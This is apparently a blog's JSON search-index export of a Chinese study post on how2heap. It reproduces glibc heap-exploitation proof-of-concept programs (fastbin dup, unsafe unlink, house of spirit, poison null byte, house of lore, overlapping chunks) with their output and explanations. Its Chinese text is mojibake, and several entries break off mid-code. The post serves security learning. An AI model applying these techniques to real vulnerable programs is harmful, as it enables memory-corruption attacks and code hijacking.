stack,\\n\" \"so that malloc will think there is a free chunk there and agree to\\n\" \"return a pointer to it.\\n\", a); stack_var = 0x20; fprintf(stderr,\"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\\n\", a); *d = (unsigned long long) (((char*)\u0026stack_var) - sizeof(d)); fprintf(stderr,\"3rd malloc(8): %p, putting the stack address on the free list\\n\", malloc(8)); fprintf(stderr,\"4th malloc(8): %p\\n\", malloc(8)); } è¾“å‡ºï¼š This file extends on fastbin_dup.c by tricking malloc into returning a pointer to a controlled location (in this case, the stack). The address we want malloc() to return is 0x7ffe1610b248. Allocating 3 buffers. 1st malloc(8): 0x1e3a010 2nd malloc(8): 0x1e3a030 3rd malloc(8): 0x1e3a050 Freeing the first one... If we free 0x1e3a010 again, things will crash because 0x1e3a010 is at the top of the free list. So, instead, we'll free 0x1e3a030. Now, we can free 0x1e3a010 again, since it's not the head of the free list. Now the free list has [0x1e3a010, 0x1e3a030, 0x1e3a010]. We'll now carry out our attack by modifying data at 0x1e3a010. 1st malloc(8): 0x1e3a010 2nd malloc(8): 0x1e3a030 Now the free list has [0x1e3a010]. Now, we have access to 0x1e3a010 while it remains at the head of the free list. so now we are writing a fake free size (in this case, 0x20) to the stack, so that malloc will think there is a free chunk there and agree to return a pointer to it. Now, we overwrite the first 8 bytes of the data at 0x1e3a010 to point right before the 0x20. 3rd malloc(8): 0x1e3a010, putting the stack address on the free list 4th malloc(8): 0x7ffe1610b248 è¿™é‡Œåˆ©ç”¨ä¸Šä¸€ä¸ªä¾‹å­çš„ double free æ¼æ´ï¼Œæ¥è®© malloc è¿”å›ä¸€ä¸ªä»»æ„åœ°å€ï¼ˆå¹¶ä¸ä¸€å®šæ˜¯æ ˆä¸Šåœ°å€ï¼‰ï¼Œä»è€Œå®ç°ä»»æ„åœ°å€è¯»å†™ã€‚é¦–å…ˆè¿˜æ˜¯ä»¥ a-\u003eb-\u003ea çš„é¡ºåºé‡Šæ”¾å†…å­˜ï¼Œéšåä¸¤æ¬¡ malloc ä½¿å¾— d æŒ‡å‘åŸæ¥ a æŒ‡å‘çš„åœ°å€ 0x1e3a010ï¼Œå¹¶ä¸” freelist é‡Œåªå‰©ä¸€ä¸ª 0x1e3a010ã€‚ ç°åœ¨ä¿®æ”¹æ ˆä¸Šå˜é‡ stack_var çš„å€¼ä¸º 0x20ï¼Œè¿™æ˜¯ä¸ºäº†ä¼ªé€  chunk_size å¤´éƒ¨è®© malloc ä»¥ä¸ºè¿™ä¸ªåœ°æ–¹æœ‰ä¸€ä¸ª chunkã€‚è¿™è¿˜ä¸å¤Ÿï¼Œæˆ‘ä»¬è¿˜éœ€è¦è®©è¿™ä¸ª chunk è¢«è®¤ä¸ºæ˜¯ç©ºé—²çš„ï¼Œä¹Ÿå°±æ˜¯è¦æŠŠå®ƒåŠ å…¥ freelist ä¸­ã€‚ æ€ä¹ˆåšå‘¢ï¼Ÿæˆ‘ä»¬çŸ¥é“ï¼Œå¯¹äºä¸€ä¸ªç©ºé—² chunk æ¥è¯´ï¼Œchunk_size ä¸‹é¢å°±æ˜¯ fdï¼Œå­˜æ”¾ä¸‹ä¸€ä¸ªç©ºé—² chunk çš„åœ°å€ã€‚è€Œ malloc è¿”å›ç»™ç”¨æˆ·çš„æŒ‡é’ˆ memï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ0x1e3a010ï¼‰æ°å¥½æŒ‡å‘ chunk_size çš„ç»“å°¾å¤„ï¼Œä¹Ÿå°±æ˜¯ fd å¼€å§‹ä½ç½®ã€‚ç°åœ¨æˆ‘ä»¬æ‹¥æœ‰ d æŒ‡é’ˆï¼Œä¹Ÿå°±èƒ½ä¿®æ”¹è¿™ä¸ªä½ç½®çš„å€¼è®©å®ƒæŒ‡å‘ stack_var çš„å‰ä¸€ä¸ªæ ˆå•å…ƒï¼ˆè¿™é‡Œæ˜¯å‘å‰ 8 å­—èŠ‚ï¼‰ï¼Œè¿™é‡Œå°±æ˜¯è¿™ä¸ªä¼ªé€  chunk çš„ chunk æŒ‡é’ˆã€‚è¿™æ ·ä¸€æ¥ï¼Œå½“æˆ‘ä»¬è¿›è¡Œ 3rd malloc(8) æ—¶ï¼Œè¯¥ chunk æŒ‡é’ˆå°±ä¼šè¿›å…¥ freelist é‡Œï¼Œæœ€å malloc çš„æ—¶å€™å°±ä¼šè¿”å›è¿™ä¸ªä¼ªé€  chunk çš„ mem æŒ‡é’ˆã€‚ æ³¨æ„æ ˆä»é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿ï¼Œå †åè¿‡æ¥ï¼Œæ‰€ä»¥æºç ä¸€å¼€å§‹æ˜¯ 8+(char *)\u0026stack_varï¼Œè€Œæœ€åæ˜¯ ((char*)\u0026stack_var) - sizeof(d)ã€‚ ","date":"2019-12-09","objectID":"/how2heap/:3:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"fastbin_dup_consolidate æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdint.h\u003e#include \u003cstdlib.h\u003e int main() { void* p1 = malloc(0x40); void* p2 = malloc(0x40); fprintf(stderr,\"Allocated two fastbins: p1=%p p2=%p\\n\", p1, p2); fprintf(stderr,\"Now free p1!\\n\"); free(p1); void* p3 = malloc(0x400); fprintf(stderr,\"Allocated large bin to trigger malloc_consolidate(): p3=%p\\n\", p3); fprintf(stderr,\"In malloc_consolidate(), p1 is moved to the unsorted bin.\\n\"); free(p1); fprintf(stderr,\"Trigger the double free vulnerability!\\n\"); fprintf(stderr,\"We can pass the check in malloc() since p1 is not fast top.\\n\"); fprintf(stderr,\"Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\\n\", malloc(0x40), malloc(0x40)); } è¾“å‡ºï¼š Allocated two fastbins: p1=0x1af0010 p2=0x1af0060 Now free p1! Allocated large bin to trigger malloc_consolidate(): p3=0x1af00b0 In malloc_consolidate(), p1 is moved to the unsorted bin. Trigger the double free vulnerability! We can pass the check in malloc() since p1 is not fast top. Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x1af0010 0x1af0010 é¦–å…ˆåˆ†é…äº†ä¸¤ä¸ª 0x40 çš„ chunkï¼Œå®é™…å¤§å°ä¸º 0x50ã€‚éœ€è¦ p2 æ˜¯ä¸ºäº†ä¹‹åé‡Šæ”¾ p1 æ—¶ä¸ä¼šå’Œ top chunk åˆå¹¶ã€‚éšåé‡Šæ”¾å…¶ä¸­ä¸€ä¸ªå¹¶ç”³è¯· 0x400 çš„ chunkï¼Œè¿™æ—¶ä¼šå°è¯•ä» unsorted bin ä¸­åˆ‡å‰²ï¼Œä½†æ˜¯ç©ºé—´ä¸è¶³ï¼Œè§¦å‘äº† malloc_consolidateï¼Œä½¿å¾— fastbin ä¸­çš„ p1 è¿›å…¥ unsorted binï¼ˆå®é™…ä¸Šï¼Œå¦‚æœæ­¤æ—¶æœ‰å¤šä¸ªè¿ç»­ chunk åœ¨ fastbin ä¸­ï¼Œä¼šå…ˆåˆå¹¶ï¼‰ä¸­ã€‚ è¿™ä¸ªæ—¶å€™ï¼Œfastbin é“¾è¡¨å¤´éƒ¨æ²¡æœ‰ p1 äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ¬¡ free(p1) å°±å¯ä»¥æˆåŠŸï¼Œé€ æˆ double freeã€‚ç°åœ¨ fastbin å’Œ unsorted bin ä¸­éƒ½æœ‰ p1 äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä¸¤æ¬¡ malloc() æ‹¿åˆ°ä¸¤ä¸ªåŒæ ·çš„æŒ‡é’ˆã€‚ ","date":"2019-12-09","objectID":"/how2heap/:4:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"unsafe_unlink æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003cstdint.h\u003e uint64_t *chunk0_ptr; int main() { fprintf(stderr,\"Welcome to unsafe unlink 2.0!\\n\"); fprintf(stderr,\"Tested in Ubuntu 14.04/16.04 64bit.\\n\"); fprintf(stderr,\"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n\"); fprintf(stderr,\"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n\"); int malloc_size = 0x80; //we want to be big enough not to use fastbins int header_size = 2; fprintf(stderr,\"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n\"); chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 fprintf(stderr,\"The global chunk0_ptr is at %p, pointing to %p\\n\", \u0026chunk0_ptr, chunk0_ptr); fprintf(stderr,\"The victim chunk we are going to corrupt is at %p\\n\\n\", chunk1_ptr); fprintf(stderr,\"We create a fake chunk inside chunk0.\\n\"); fprintf(stderr,\"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to \u0026chunk0_ptr so that P-\u003efd-\u003ebk = P.\\n\"); chunk0_ptr[2] = (uint64_t) \u0026chunk0_ptr-(sizeof(uint64_t)*3); fprintf(stderr,\"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to \u0026chunk0_ptr so that P-\u003ebk-\u003efd = P.\\n\"); fprintf(stderr,\"With this setup we can pass this check: (P-\u003efd-\u003ebk != P || P-\u003ebk-\u003efd != P) == False\\n\"); chunk0_ptr[3] = (uint64_t) \u0026chunk0_ptr-(sizeof(uint64_t)*2); fprintf(stderr,\"Fake chunk fd: %p\\n\",(void*) chunk0_ptr[2]); fprintf(stderr,\"Fake chunk bk: %p\\n\\n\",(void*) chunk0_ptr[3]); fprintf(stderr,\"We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n\"); uint64_t *chunk1_hdr = chunk1_ptr - header_size; fprintf(stderr,\"We shrink the size of chunk0 (saved as'previous_size'in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n\"); fprintf(stderr,\"It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n\"); chunk1_hdr[0] = malloc_size; fprintf(stderr,\"If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\\n\",(void*)chunk1_hdr[0]); fprintf(stderr,\"We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\\n\\n\"); chunk1_hdr[1] \u0026= ~1; fprintf(stderr,\"Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n\"); fprintf(stderr,\"You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n\"); free(chunk1_ptr); fprintf(stderr,\"At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n\"); char victim_string[8]; strcpy(victim_string,\"Hello!~\"); chunk0_ptr[3] = (uint64_t) victim_string; fprintf(stderr,\"chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n\"); fprintf(stderr,\"Original value: %s\\n\",victim_string); chunk0_ptr[0] = 0x4141414142424242LL; fprintf(stderr,\"New Value: %s\\n\",victim_string); } è¾“å‡ºï¼š Welcome to unsafe unlink 2.0! Tested in Ubuntu 14.04/16.04 64bit. This technique can be used when you have a pointer at a known location to a region you can call unlink on. The most common scenario is a vulnerable buffer that can be overflown and has a global pointer. The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write. The global chunk0_ptr is at 0x602070, pointing to 0x23ed010 The victim chunk we are going to corrupt is at 0x23ed0a0 We create a fake chunk inside chunk0. We setup the 'next_free_chunk' (fd) of our fake chunk to point near to \u0026chunk0_ptr so that P-\u003efd-\u003ebk = P. We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to \u0026chunk0_ptr ","date":"2019-12-09","objectID":"/how2heap/:5:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"house_of_spirit æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e int main() { fprintf(stderr,\"This file demonstrates the house of spirit attack.\\n\"); fprintf(stderr,\"Calling malloc() once so that it sets up its memory.\\n\"); malloc(1); fprintf(stderr,\"We will now overwrite a pointer to point to a fake 'fastbin' region.\\n\"); unsigned long long *a; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr,\"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\\n\", sizeof(fake_chunks), \u0026fake_chunks[1], \u0026fake_chunks[9]); fprintf(stderr,\"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (\u003c= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n\"); fprintf(stderr,\"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n\"); fake_chunks[1] = 0x40; // this is the size fprintf(stderr,\"The chunk.size of the *next* fake region has to be sane. That is\u003e 2*SIZE_SZ (\u003e 16 on x64) \u0026\u0026 \u003cav-\u003esystem_mem (\u003c128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\\n\"); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize fprintf(stderr,\"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n\", \u0026fake_chunks[1]); fprintf(stderr,\"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n\"); a = \u0026fake_chunks[2]; fprintf(stderr,\"Freeing the overwritten pointer.\\n\"); free(a); fprintf(stderr,\"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\", \u0026fake_chunks[1], \u0026fake_chunks[2]); fprintf(stderr,\"malloc(0x30): %p\\n\", malloc(0x30)); } è¾“å‡ºï¼š This file demonstrates the house of spirit attack. Calling malloc() once so that it sets up its memory. We will now overwrite a pointer to point to a fake 'fastbin' region. This region (memory of length: 80) contains two chunks. The first starts at 0x7ffcdc8eeb88 and the second at 0x7ffcdc8eebc8. This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (\u003c= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems. ... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. The chunk.size of the *next* fake region has to be sane. That is \u003e 2*SIZE_SZ (\u003e 16 on x64) \u0026\u0026 \u003cav-\u003esystem_mem (\u003c128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size. Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffcdc8eeb88. ... note that the memory address of the *region* associated with this chunk must be 16-byte aligned. Freeing the overwritten pointer. Now the next malloc will return the region of our fake chunk at 0x7ffcdc8eeb88, which will be 0x7ffcdc8eeb90! malloc(0x30): 0x7ffcdc8eeb90 è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œåœ¨ fake_chunks æ•°ç»„é‡Œä¼ªé€ äº† fastbin å¤§å°çš„ chunkï¼Œç¡®ä¿å½“å‰ chunk_size å’Œ nextsize åˆæ³•åï¼ŒæŠŠ fake chunk çš„ mem æŒ‡é’ˆåœ°å€ç»™æŒ‡é’ˆ aï¼Œç„¶å free(a)ï¼Œè¿™æ ·å°±ä½¿å¾— fake chunk è¿›å…¥äº† fastbinï¼Œä¸‹æ¬¡ malloc å°±ä¼šè¿”å›è¿™ä¸ª mem æŒ‡é’ˆã€‚ è¿™é‡Œçš„åˆæ³•æ˜¯æŒ‡ï¼š chunk_size çš„ IS_MMAPED ä¸º 0 chunk_size å±äº fastbin èŒƒå›´å†… nextsize å¤§äº 2*SIZE_SZï¼Œå°äº system_mem ","date":"2019-12-09","objectID":"/how2heap/:6:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"poison_null_byte æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003cstdint.h\u003e#include \u003cmalloc.h\u003e int main() { fprintf(stderr,\"Welcome to poison null byte 2.0!\\n\"); fprintf(stderr,\"Tested in Ubuntu 14.04 64bit.\\n\"); fprintf(stderr,\"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\\n\"); fprintf(stderr,\"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\\n\"); uint8_t* a; uint8_t* b; uint8_t* c; uint8_t* b1; uint8_t* b2; uint8_t* d; void *barrier; fprintf(stderr,\"We allocate 0x100 bytes for 'a'.\\n\"); a = (uint8_t*) malloc(0x100); fprintf(stderr,\"a: %p\\n\", a); int real_a_size = malloc_usable_size(a); fprintf(stderr,\"Since we want to overflow 'a', we need to know the 'real' size of 'a' \" \"(it may be more than 0x100 because of rounding): %#x\\n\", real_a_size); /* chunk size attribute cannot have a least significant byte with a value of 0x00. * the least significant byte of this will be 0x10, because the size of the chunk includes * the amount requested plus some amount required for the metadata. */ b = (uint8_t*) malloc(0x200); fprintf(stderr,\"b: %p\\n\", b); c = (uint8_t*) malloc(0x100); fprintf(stderr,\"c: %p\\n\", c); barrier = malloc(0x100); fprintf(stderr,\"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\\n\" \"The barrier is not strictly necessary, but makes things less confusing\\n\", barrier); uint64_t* b_size_ptr = (uint64_t*)(b - 8); // added fix for size==prev_size(next_chunk) check in newer versions of glibc // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30 // this added check requires we are allowed to have null pointers in b (not just a c string) //*(size_t*)(b+0x1f0) = 0x200; fprintf(stderr,\"In newer versions of glibc we will need to have our updated size inside b itself to pass \" \"the check'chunksize(P) != prev_size (next_chunk(P))'\\n\"); // we set this location to 0x200 since 0x200 == (0x211 \u0026 0xff00) // which is the value of b.size after its first byte has been overwritten with a NULL byte *(size_t*)(b+0x1f0) = 0x200; // this technique works by overwriting the size metadata of a free chunk free(b); fprintf(stderr,\"b.size: %#lx\\n\", *b_size_ptr); fprintf(stderr,\"b.size is: (0x200 + 0x10) | prev_in_use\\n\"); fprintf(stderr,\"We overflow 'a' with a single null byte into the metadata of 'b'\\n\"); a[real_a_size] = 0; // \u003c--- THIS IS THE\"EXPLOITED BUG\" fprintf(stderr,\"b.size: %#lx\\n\", *b_size_ptr); uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2; fprintf(stderr,\"c.prev_size is %#lx\\n\",*c_prev_size_ptr); // This malloc will result in a call to unlink on the chunk where b was. // The added check (commit id: 17f487b), if not properly handled as we did before, // will detect the heap corruption now. // The check is this: chunksize(P) != prev_size (next_chunk(P)) where // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow) // next_chunk(P) == b-0x10+0x200 == b+0x1f0 // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200 fprintf(stderr,\"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\\n\", *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8)))); b1 = malloc(0x100); fprintf(stderr,\"b1: %p\\n\",b1); fprintf(stderr,\"Now we malloc 'b1'. It will be placed where 'b' was. \" \"At this point c.prev_size should have been updated, but it was not: %#lx\\n\",*c_prev_size_ptr); fprintf(stderr,\"Interestingly, the updated value of c.prev_size has been written 0x10 bytes \" \"before c.prev_size: %lx\\n\",*(((uint64_t*)c)-4)); fprintf(stderr,\"We malloc 'b2', our 'victim' chunk.\\n\"); // Typically b2 (the victim) will be a structure with valuable pointers that we want to control b2 = malloc(0x80); fprintf(stderr,\"b2: %p\\n\",b2); memset(b2,'B',0x80); fprintf(stderr,\"Current b2 content:\\n%s\\n\",b2); fprintf(stderr,\"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting a","date":"2019-12-09","objectID":"/how2heap/:7:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"house_of_lore æºç ï¼š /* Advanced exploitation of the House of Lore - Malloc Maleficarum. This PoC take care also of the glibc hardening of smallbin corruption. [...] else { bck = victim-\u003ebk; if (__glibc_unlikely (bck-\u003efd != victim)){ errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } set_inuse_bit_at_offset (victim, nb); bin-\u003ebk = bck; bck-\u003efd = bin; [...] */ #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003cstdint.h\u003e void jackpot(){ puts(\"Nice jump d00d\"); exit(0); } int main(int argc, char * argv[]){ intptr_t* stack_buffer_1[4] = {0}; intptr_t* stack_buffer_2[3] = {0}; fprintf(stderr,\"\\nWelcome to the House of Lore\\n\"); fprintf(stderr,\"This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n\"); fprintf(stderr,\"This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\\n\\n\"); fprintf(stderr,\"Allocating the victim chunk\\n\"); intptr_t *victim = malloc(100); fprintf(stderr,\"Allocated the first small chunk on the heap at %p\\n\", victim); // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk intptr_t *victim_chunk = victim-2; fprintf(stderr,\"stack_buffer_1 at %p\\n\", (void*)stack_buffer_1); fprintf(stderr,\"stack_buffer_2 at %p\\n\", (void*)stack_buffer_2); fprintf(stderr,\"Create a fake chunk on the stack\\n\"); fprintf(stderr,\"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted\" \"in second to the last malloc, which putting stack address on smallbin list\\n\"); stack_buffer_1[0] = 0; stack_buffer_1[1] = 0; stack_buffer_1[2] = victim_chunk; fprintf(stderr,\"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 \" \"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake\" \"chunk on stack\"); stack_buffer_1[3] = (intptr_t*)stack_buffer_2; stack_buffer_2[2] = (intptr_t*)stack_buffer_1; fprintf(stderr,\"Allocating another large chunk in order to avoid consolidating the top chunk with\" \"the small one during the free()\\n\"); void *p5 = malloc(1000); fprintf(stderr,\"Allocated the large chunk on the heap at %p\\n\", p5); fprintf(stderr,\"Freeing the chunk %p, it will be inserted in the unsorted bin\\n\", victim); free((void*)victim); fprintf(stderr,\"\\nIn the unsorted bin the victim's fwd and bk pointers are nil\\n\"); fprintf(stderr,\"victim-\u003efwd: %p\\n\", (void *)victim[0]); fprintf(stderr,\"victim-\u003ebk: %p\\n\\n\", (void *)victim[1]); fprintf(stderr,\"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\\n\"); fprintf(stderr,\"This means that the chunk %p will be inserted in front of the SmallBin\\n\", victim); void *p2 = malloc(1200); fprintf(stderr,\"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n\", p2); fprintf(stderr,\"The victim chunk has been sorted and its fwd and bk pointers updated\\n\"); fprintf(stderr,\"victim-\u003efwd: %p\\n\", (void *)victim[0]); fprintf(stderr,\"victim-\u003ebk: %p\\n\\n\", (void *)victim[1]); //------------VULNERABILITY----------- fprintf(stderr,\"Now emulating a vulnerability that can overwrite the victim-\u003ebk pointer\\n\"); victim[1] = (intptr_t)stack_buffer_1; // victim-\u003ebk is pointing to stack //------------------------------------ fprintf(stderr,\"Now allocating a chunk with size equal to the first one freed\\n\"); fprintf(stderr,\"This should return the overwritten victim chunk and set the bin-\u003ebk to the injected victim-\u003ebk pointer\\n\"); void *p3 = malloc(100); fprintf(stderr,\"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-\u003ebk\\n\"); char *p4 = malloc(100); fprintf(stderr,\"p4 = malloc(100)\\n\"); fprintf(stderr,\"\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n\", stack_buffer_2[2]); fprintf(stderr,\"\\np4 is %p and should be on the stack!\\n\", p4); // this chunk will be allocated on stack intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory ","date":"2019-12-09","objectID":"/how2heap/:8:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"overlapping_chunks æºç ï¼š /* A simple tale of overlapping chunk. This technique is taken from http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf */ #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003cstdint.h\u003e int main(int argc , char* argv[]){ intptr_t *p1,*p2,*p3,*p4; fprintf(stderr,\"\\nThis is a simple chunks overlapping problem\\n\\n\"); fprintf(stderr,\"Let's start to allocate 3 chunks on the heap\\n\"); p1 = malloc(0x100 - 8); p2 = malloc(0x100 - 8); p3 = malloc(0x80 - 8); fprintf(stderr,\"The 3 chunks have been allocated here:\\np1=%p\\np2=%p\\np3=%p\\n\", p1, p2, p3); memset(p1,'1', 0x100 - 8); memset(p2,'2', 0x100 - 8); memset(p3,'3', 0x80 - 8); fprintf(stderr,\"\\nNow let's free the chunk p2\\n\"); free(p2); fprintf(stderr,\"The chunk p2 is now in the unsorted bin ready to serve possible\\nnew malloc() of its size\\n\"); fprintf(stderr,\"Now let's simulate an overflow that can overwrite the size of the\\nchunk freed p2.\\n\"); fprintf(stderr,\"For a toy program, the value of the last 3 bits is unimportant;\" \"however, it is best to maintain the stability of the heap.\\n\"); fprintf(stderr,\"To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),\" \"to assure that p1 is not mistaken for a free chunk.\\n\"); int evil_chunk_size = 0x181; int evil_region_size = 0x180 - 8; fprintf(stderr,\"We are going to set the size of chunk p2 to to %d, which gives us\\na region size of %d\\n\", evil_chunk_size, evil_region_size); *(p2-1) = evil_chunk_size; // we are overwriting the \"size\" field of chunk p2 fprintf(stderr,\"\\nNow let's allocate another chunk with a size equal to the data\\n\" \"size of the chunk p2 injected size\\n\"); fprintf(stderr,\"This malloc will be served from the previously freed chunk that\\n\" \"is parked in the unsorted bin which size has been modified by us\\n\"); p4 = malloc(evil_region_size); fprintf(stderr,\"\\np4 has been allocated at %p and ends at %p\\n\", (char *)p4, (char *)p4+evil_region_size); fprintf(stderr,\"p3 starts at %p and ends at %p\\n\", (char *)p3, (char *)p3+0x80-8); fprintf(stderr,\"p4 should overlap with p3, in this case p4 includes all p3.\\n\"); fprintf(stderr,\"\\nNow everything copied inside chunk p4 can overwrites data on\\nchunk p3,\" \"and data written to chunk p3 can overwrite data\\nstored in the p4 chunk.\\n\\n\"); fprintf(stderr,\"Let's run through an example. Right now, we have:\\n\"); fprintf(stderr,\"p4 = %s\\n\", (char *)p4); fprintf(stderr,\"p3 = %s\\n\", (char *)p3); fprintf(stderr,\"\\nIf we memset(p4,'4', %d), we have:\\n\", evil_region_size); memset(p4,'4', evil_region_size); fprintf(stderr,\"p4 = %s\\n\", (char *)p4); fprintf(stderr,\"p3 = %s\\n\", (char *)p3); fprintf(stderr,\"\\nAnd if we then memset(p3,'3', 80), we have:\\n\"); memset(p3,'3', 80); fprintf(stderr,\"p4 = %s\\n\", (char *)p4); fprintf(stderr,\"p3 = %s\\n\", (char *)p3); } è¾“å‡ºï¼š This is a simple chunks overlapping problem Let's start to allocate 3 chunks on the heap The 3 chunks have been allocated here: p1=0x1b9a010 p2=0x1b9a110 p3=0x1b9a210 Now let's free the chunk p2 The chunk p2 is now in the unsorted bin ready to serve possible new malloc() of its size Now let's simulate an overflow that can overwrite the size of the chunk freed p2. For a toy program, the value of the last 3 bits is unimportant; however, it is best to maintain the stability of the heap. To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse), to assure that p1 is not mistaken for a free chunk. We are going to set the size of chunk p2 to to 385, which gives us a region size of 376 Now let's allocate another chunk with a size equal to the data size of the chunk p2 injected size This malloc will be served from the previously freed chunk that is parked in the unsorted bin which size has been modified by us p4 has been allocated at 0x1b9a110 and ends at 0x1b9a288 p3 starts at 0x1b9a210 and ends at 0x1b9a288 p4 should overlap with p3, in this case p4 includes all p3. Now everything copied inside chunk p4 can overwrites data on chunk p3","date":"2019-12-09","objectID":"/how2heap/:9:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"overlapping_chunks_2 æºç ï¼š /* Yet another simple tale of overlapping chunk. This technique is taken from https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf. This is also referenced as Nonadjacent Free Chunk Consolidation Attack. */ #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e#include \u003cstdint.h\u003e#include \u003cmalloc.h\u003e int main(){ intptr_t *p1,*p2,*p3,*p4,*p5,*p6; unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6; int prev_in_use = 